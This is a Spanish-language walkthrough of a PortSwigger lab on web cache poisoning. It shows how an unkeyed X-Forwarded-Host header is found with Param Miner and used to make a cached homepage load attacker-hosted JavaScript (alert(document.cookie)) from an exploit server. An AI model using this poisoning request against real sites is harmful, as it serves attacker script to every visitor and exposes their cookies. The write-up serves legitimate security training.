# 🧪 Poisoning con header no indexado

## 📄 Descripción del laboratorio

Este laboratorio es vulnerable a **Web Cache Poisoning** debido a que el backend utiliza una cabecera HTTP que **no forma parte de la cache key**.

Un usuario visita regularmente la página principal del sitio, lo que permite persistir una respuesta maliciosa en la caché.

El objetivo es envenenar la caché con una respuesta que ejecute:

```javascript
alert(document.cookie)
```

en el navegador del visitante.



## 📚 Teoría

### 📌 Web Cache Poisoning

Las aplicaciones web modernas suelen utilizar sistemas de caché para mejorar el rendimiento. Estos sistemas guardan respuestas HTTP y las reutilizan para múltiples usuarios.

Para decidir cuándo reutilizar una respuesta, la caché utiliza una **cache key**.

### 📌 Cache key

La cache key es el conjunto de elementos que identifican una respuesta en caché.

Normalmente incluye:

```
path
query string
algunas cabeceras
```

Por ejemplo:

```
/index
/index?lang=en
```

pueden considerarse entradas distintas dependiendo de la configuración.

### 📌 Problema de las cabeceras no indexadas

El problema aparece cuando:

* el backend utiliza una cabecera HTTP para construir la respuesta
* la caché **no incluye esa cabecera en la cache key**

Esto permite modificar el contenido servido **sin cambiar la clave de caché**.

Como resultado:

* la respuesta maliciosa se almacena
* otros usuarios reciben esa respuesta contaminada.

### 📌 Vulnerabilidad del laboratorio

En este laboratorio la aplicación utiliza la cabecera:

```http
X-Forwarded-Host
```

para generar URLs absolutas de recursos JavaScript.

Conceptualmente el backend genera algo similar a:

```html
<script src="https://X-Forwarded-Host/resources/js/tracking.js"></script>
```

Sin embargo:

* `X-Forwarded-Host` **no forma parte de la cache key**
* la respuesta sí se cachea.

Esto permite que un atacante introduzca un dominio controlado y que ese contenido quede almacenado en la caché.



## 📝 Práctica

### 1️⃣ Analizar el comportamiento de la caché

Interceptamos una petición a la página principal y la enviamos al **Repeater**.

<img width="1377" height="326" alt="image" src="https://github.com/user-attachments/assets/d4cc1613-d362-43d4-9b2e-6800377d6e83" />
<br>
Observamos cabeceras como:

```http
Age: 15
X-Cache: hit
```

Esto indica que la respuesta está siendo servida desde la caché.



### 2️⃣ Identificar elementos que forman parte de la cache key

Probamos a modificar el query string:

```http
GET /?test=1
GET /?test=2
```

<img width="1384" height="319" alt="image" src="https://github.com/user-attachments/assets/30bb7379-5f9c-49ae-a27e-646945235ba7" />
<br>
Observamos que el valor de `Age` se reinicia.

Esto indica que el query string forma parte de la cache key.

Necesitamos encontrar un elemento que:

* afecte al contenido de la respuesta
* no forme parte de la cache key.



### 3️⃣ Detectar cabeceras no indexadas

Utilizamos la extensión **Param Miner** en Burp Suite.

En el Repeater:

```
Right click → Param Miner → Guess headers
```

La extensión prueba automáticamente múltiples cabeceras.

<img width="814" height="187" alt="image" src="https://github.com/user-attachments/assets/005c728a-d303-4c47-91c3-43c03c4384cb" />
<br>
Revisando la sección **All issues** encontramos que la cabecera:

```
X-Forwarded-Host
```

afecta al contenido de la respuesta.

<img width="1455" height="329" alt="image" src="https://github.com/user-attachments/assets/cbf55a5c-32f3-421e-b3f8-4918666b3031" />



### 4️⃣ Confirmar el impacto de la cabecera

Añadimos manualmente la cabecera:

```http
X-Forwarded-Host: test.com
```

Enviamos la petición.

<img width="1375" height="516" alt="image" src="https://github.com/user-attachments/assets/49bb175e-8891-4741-a923-d4b2b888864e" />
<br>
Observamos que el HTML generado ahora intenta cargar recursos desde:

```
https://test.com/resources/js/tracking.js
```

Esto confirma que el backend utiliza directamente el valor de `X-Forwarded-Host`.



### 5️⃣ Preparar el payload malicioso

Accedemos al **Exploit Server**.

Creamos un archivo JavaScript en la ruta esperada por la aplicación:

```
/resources/js/tracking.js
```

Contenido del archivo:

```javascript
alert(document.cookie)
```

<img width="754" height="863" alt="image" src="https://github.com/user-attachments/assets/4ff17c93-42b7-4f09-97f0-614015082b88" />
<br>
Guardamos el exploit y copiamos el dominio del Exploit Server, por ejemplo:

```
exploit-xxxx.exploit-server.net
```



### 6️⃣ Envenenar la caché

Volvemos al Repeater y enviamos la petición final:

```http
GET / HTTP/1.1
Host: lab-id.web-security-academy.net
X-Forwarded-Host: exploit-xxxx.exploit-server.net
```

Es importante:

* no modificar el path
* no añadir parámetros en la URL

La cache key sigue siendo:

```
/
```

Enviamos la petición varias veces hasta observar:

```http
X-Cache: hit
```

Esto indica que la respuesta maliciosa ha sido almacenada en la caché.

<img width="1399" height="488" alt="image" src="https://github.com/user-attachments/assets/8eadab70-b6d5-4f77-bf51-4ed599633a3a" />



### 7️⃣ Impacto en la víctima

Mientras la entrada permanezca en la caché:

* cualquier usuario que visite `/`
* recibirá la respuesta contaminada.

El navegador cargará el script:

```
https://exploit-xxxx.exploit-server.net/resources/js/tracking.js
```

Esto ejecutará:

```javascript
alert(document.cookie)
```

El laboratorio detecta la ejecución y se marca como completado.

<img width="822" height="278" alt="image" src="https://github.com/user-attachments/assets/b96c2891-bca9-4d91-9399-c8aa5d340130" />



### 8️⃣ Resultado

Mediante **Web Cache Poisoning con cabecera no indexada** se ha conseguido:

* identificar una cabecera utilizada por el backend pero ignorada por la caché
* modificar el contenido de la respuesta
* almacenar una respuesta maliciosa en la caché
* ejecutar JavaScript en el navegador de otros usuarios.

El laboratorio queda resuelto.
